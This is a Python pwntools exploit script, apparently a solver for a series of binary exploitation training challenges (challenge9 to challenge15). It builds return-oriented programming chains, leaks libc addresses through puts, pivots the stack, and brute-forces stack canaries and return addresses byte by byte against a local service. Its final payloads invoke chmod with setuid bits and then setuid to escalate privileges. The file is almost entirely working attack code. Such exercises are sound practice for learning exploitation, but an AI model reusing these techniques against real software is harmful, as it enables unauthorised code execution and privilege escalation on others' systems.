from pwn import *
import os
import time

def challenge9():
    # b *0x0000000000402576
    # with gdb.debug([f"/challenge/{os.getenv('HOSTNAME')}"], '''
    # b *0x0000000000402576
    # disp/5i $rip
    # disp/8gx $rsp
    # c
    # c
    # ''') as p:
    with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:
        libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")

        vuln_elf = ELF(f"/challenge/{os.getenv('HOSTNAME')}")
        vuln_rop = ROP(vuln_elf)

        POP_RBP = p64(vuln_rop.find_gadget(['pop rbp', 'ret']).address)
        LEAVE = p64(vuln_rop.find_gadget(['leave', 'ret']).address)
        bss = p64(0x414080+16)
        # 414080

        libc_func = "puts"
        PUTS_PLT = p64(vuln_elf.plt['puts'])
        MAIN_PLT = p64(vuln_elf.symbols['challenge'])
        POP_RDI = p64(vuln_rop.find_gadget(['pop rdi', 'ret']).address)
        RET = p64(vuln_rop.find_gadget(['ret']).address)
        PUTS_GOT = p64(vuln_elf.got['puts'])

        info(p.readrepeat(1))
        p.send(
            POP_RBP + bss + LEAVE + POP_RDI + PUTS_GOT + PUTS_PLT + MAIN_PLT
        )

        info(p.readuntil(b'Leaving!\n'))
        addr = p.readlineb().strip()
        addr = b'\x20' + flat(addr, endian='little')
        addr = int.from_bytes(addr, "little")
        libc.address = addr - libc.symbols['puts']
        rop = ROP(libc)
        pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
        pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
        syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
        leaving = p64(0x402004)
        bss = p64(0x4140b8+16)

        info(p.readrepeat(1)) 
        p.send(
            POP_RBP + bss + LEAVE + RET + RET + RET + RET + RET + RET + RET +
            pop_rax+p64(0x5a)+pop_rdi+leaving+pop_rsi+p64(0x9ed)+syscall+
            pop_rax+p64(0x69)+syscall
        )
        info(p.readrepeat(1))

    # p.poll(block=True)


def challenge10():
    buff_size = 14
    leave_offset = b'\x76'
    with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:
        info(p.readuntil(b'located at: '))
        addr = p64(int(hex(int(p.readlineb().strip()[2:-1].decode(),16)),16)-0x10)
        p.send(
            addr * buff_size + leave_offset
        )
        info(p.readrepeat(1))

def challenge11():
    buff_size = 12
    leave_offset = b'\x8c'
    with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:
        info(p.readuntil(b'located at: '))
        addr = p64(int(hex(int(p.readlineb().strip()[2:-1].decode(),16)),16)-0x10)
        p.send(
            addr * buff_size + leave_offset
        )
        info(p.readrepeat(1))

def challenge12():
    buff_size = 22
    leave_offset = b'\x67\x36\x0e'
    with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:
        info(p.readuntil(b'located at: '))
        addr = p64(int(hex(int(p.readlineb().strip()[2:-1].decode(),16)),16)-0x10)
        info(f'[LEAK] {addr}')
        p.send(
            addr * buff_size + leave_offset
        )
        info(p.readrepeat(1))

def challenge13():
    buffer = b'a'*40
    padding = b'b'*8
    _libc_start_main_offset = 0x32
    pop_rdi_offset = 464
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    vuln_elf = ELF(f"/challenge/{os.getenv('HOSTNAME')}")
    

    # with gdb.debug([f"/challenge/{os.getenv('HOSTNAME')}"], '''
    # b *main+310
    # b *main+363
    # disp/5i $rip
    # disp/40gx $rsp
    # ''') as p:

    with process([f"/challenge/{os.getenv('HOSTNAME')}"], close_fds=False) as p:

        info(p.readuntil(b'located at: '))
        canary_address = hex(int(p.readlineb().strip()[2:-1].decode(), 16)+(8*5))
        p.sendline(
            canary_address
        )
        info(p.readuntil(b'= '))
        canary = p64(int(hex(int(p.readlineb().strip()[2:].decode(),16)),16))
        p.send(
            buffer + canary + padding + p8(_libc_start_main_offset)
        )

        info(p.readuntil(b'located at: '))
        libcstart_addr = hex(int(p.readlineb().strip()[2:-1].decode(), 16)+(8*7))
        p.sendline(
            libcstart_addr
        )

        info(p.readuntil(b'= '))
        libc_repeat = p64(int(p.readlineb().strip()[2:].decode(),16)-0x83+_libc_start_main_offset)
        p.send(
            buffer + canary + padding + libc_repeat
        )

        info(p.readuntil(b'located at: '))
        main_addr = hex(int(p.readlineb().strip()[2:-1].decode(), 16)+(8*11))
        p.sendline(
            main_addr
        )

        info(p.readuntil(b'= '))
        main_plt = int(p.readlineb().strip()[2:].decode(), 16)
        puts_plt = main_plt-(vuln_elf.symbols['main']-vuln_elf.plt['puts']+0x4)
        puts_got = main_plt+(vuln_elf.got['puts']-vuln_elf.symbols['main'])
        pop_rdi = main_plt+pop_rdi_offset

        print(f"main {hex(vuln_elf.symbols['main'])} plt {hex(vuln_elf.plt['puts'])} got {hex(vuln_elf.got['puts'])}")

        p.send(
            buffer + canary + padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + libc_repeat 
        )

        info(p.readuntil(b'### Goodbye!\n'))
        addr = p.readlineb().strip()
        addr = b'\x20' + flat(addr, endian='little')
        addr = int.from_bytes(addr, "little")
        libc.address = addr - libc.symbols['puts']

        rop = ROP(libc)
        pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
        pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
        pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
        syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
        trash_string = p64(next(libc.search(b'libc_intl_domainname')))

        p.sendline(
            main_addr
        )
        info(p.readrepeat(1))
        p.send(
            buffer + canary + b'c'*8 +
            pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
            pop_rax+p64(0x69)+syscall
        )    
        info(p.readrepeat(1))


def challenge14():
    gdbscript='''
    set follow-fork-mode child
    disp/5i $rip
    disp/40gx $rsp
    b *challenge+217
    c
    '''
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    vuln_elf = ELF(f"/challenge/{os.getenv('HOSTNAME')}")
    offset = b'a' * 40
    ret_addr_offset = 0x18a5
    pop_rdi_offset = 0x1933

    payload = offset + p8(0)

    for _ in range(7):
        for i in range(256):
            r = remote("localhost", 1337, level='CRITICAL')
            r.clean()
            r.send(payload + p8(i))
            check_stack = r.clean()
            if b'stack smashing' not in check_stack:
                info(f'correct byte is {hex(i)}')
                payload += p8(i)
                break
            else:
                r.close()

    payload += b'b'*8 
    ret_addr_bytes = b''
    ret_addr_array = []

    for _ in range(8):
        for i in range(256):
            r = remote("localhost", 1337, level='CRITICAL')
            r.clean()
            r.send(payload + ret_addr_bytes + p8(i))
            check_stack = r.clean()
            if b'### Goodbye!' in check_stack:
                info(f'correct byte is {hex(i)}')
                ret_addr_bytes += p8(i)
                ret_addr_array.append(i)
                break
            else:
                r.close()

    bytes_val = b''
    for a in ret_addr_array:
        bytes_val += a.to_bytes(2, 'little')[:-1]

    ret_addr = int.from_bytes(bytes_val, "little")

    main_plt = ret_addr-(ret_addr_offset-vuln_elf.symbols['main'])
    puts_plt = main_plt-(vuln_elf.symbols['main']-vuln_elf.plt['puts']+0x4)
    puts_got = main_plt+(vuln_elf.got['puts']-vuln_elf.symbols['main'])
    pop_rdi = main_plt+(pop_rdi_offset-vuln_elf.symbols['main'])

    r = remote("localhost", 1337, level='CRITICAL')
    r.clean()
    r.send(payload + p64(pop_rdi)+p64(puts_got)+p64(puts_plt))

    info(r.readuntil(b'Leaving!\n'))
    addr = r.readlineb().strip()
    addr = b'\x20' + flat(addr, endian='little')
    addr = int.from_bytes(addr, "little")
    print(hex(addr))
    libc.address = addr - libc.symbols['puts']

    rop = ROP(libc)
    pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
    pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
    pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
    syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
    trash_string = p64(next(libc.search(b'libc_intl_domainname')))

    r = remote("localhost", 1337, level='CRITICAL')
    r.clean()
    r.send(payload+
        pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
        pop_rax+p64(0x69)+syscall
    )
    info(r.clean())

def challenge15():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    vuln_elf = ELF(f"/challenge/{os.getenv('HOSTNAME')}")
    offset = b'a' * 56
    ret_addr_offset = 0x24083

    # payload = offset + p8(0)

    # for n in range(7):
    #     for i in range(256):
    #         r = remote("localhost", 1337, level='CRITICAL')
    #         r.clean()
    #         r.send(payload + p8(i))
    #         check_stack = r.clean()
    #         if b'stack smashing' not in check_stack:
    #             info(f'correct byte is for canary {n} is {hex(i)}')
    #             payload += p8(i)
    #             r.close()
    #             break
    #         else:
    #             r.close()
    payload = offset + p64(0xbc3a7a8cdbfb1500)

    payload += b'b'*8
    ret_addr_bytes = b'\x14'
    ret_addr_array = [0x14, 0x40, 0xf5, 0xc5, 0xc, 0x7f, 0x0, 0x0]

    # for _ in range(4):
    #     for i in range(256):
    #         r = remote("localhost", 1337, level='CRITICAL')
    #         r.clean()
    #         r.send(payload + ret_addr_bytes + p8(i))
    #         check_stack = r.clean()
    #         # info(check_stack)
    #         if b'Welcome' in check_stack:
    #             info(f'correct byte is {hex(i)}')
    #             ret_addr_bytes += p8(i)
    #             ret_addr_array.append(i)
    #             r.close()
    #             break
    #         else:
    #             r.close()

    # ret_addr_array.append(0x7f)
    # ret_addr_array.append(0x00)
    # ret_addr_array.append(0x00)

    bytes_val = b''
    for a in ret_addr_array:
        bytes_val += a.to_bytes(2, 'little')[:-1]

    ret_addr = int.from_bytes(bytes_val, "little")
    ret_addr = ret_addr + (0x83-0x14)
    addr = ret_addr - (ret_addr_offset-libc.symbols['__libc_start_main'])
    libc.address = addr - libc.symbols['__libc_start_main']
    
    rop = ROP(libc)
    pop_rax = p64(rop.find_gadget(['pop rax', 'ret']).address)
    pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret']).address)
    pop_rsi = p64(rop.find_gadget(['pop rsi', 'ret']).address)
    syscall = p64(rop.find_gadget(['syscall', 'ret']).address)
    trash_string = p64(next(libc.search(b'libc_intl_domainname')))

    r = remote("localhost", 1337, level='CRITICAL')
    r.clean()
    r.send(payload+
        pop_rax+p64(90)+pop_rdi+trash_string+pop_rsi+p64(0x9ed)+syscall+
        pop_rax+p64(0x69)+syscall
    )
    info(r.clean())



def main():
    context.arch = 'amd64'
    context.encoding ='latin'
    context.log_level = 'INFO'
    context.terminal = ["tmux", "splitw", "-h"]
    warnings.simplefilter('ignore')
    challenge15()


if __name__ == "__main__":
    main()



    

# core = Coredump('./core')
# print(core)


    